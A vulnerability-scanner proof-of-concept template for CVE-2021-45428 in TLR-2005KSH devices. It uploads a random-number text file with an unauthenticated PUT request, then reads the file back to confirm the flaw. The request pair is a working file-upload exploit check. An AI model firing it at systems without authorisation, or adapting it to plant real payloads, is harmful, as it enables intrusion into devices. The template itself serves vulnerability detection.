name: poc-yaml-tlr-2005ksh-cve-2021-45428
manual: true
transport: http
set:
    a1: randomInt(200000000, 210000000)
    a2: randomInt(200000000, 210000000)
rules:
    r1:
        request:
            cache: true
            method: PUT
            path: /{{a1}}.txt
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: c={{a2}}
        expression: response.status == 201
    r2:
        request:
            cache: true
            method: GET
            path: /{{a1}}.txt
        expression: response.body.bcontains(bytes(string(a2)))
expression: r1() && r2()
detail:
    author: xiaobaicai
    links:
        - https://www.cnvd.org.cn/flaw/show/CNVD-2022-04552
    vulnerability:
        id: CT-224076
        level: critical
    version: 1.0.0
    warning: 注意该脚本会上传文件产生一个临时的无害文件
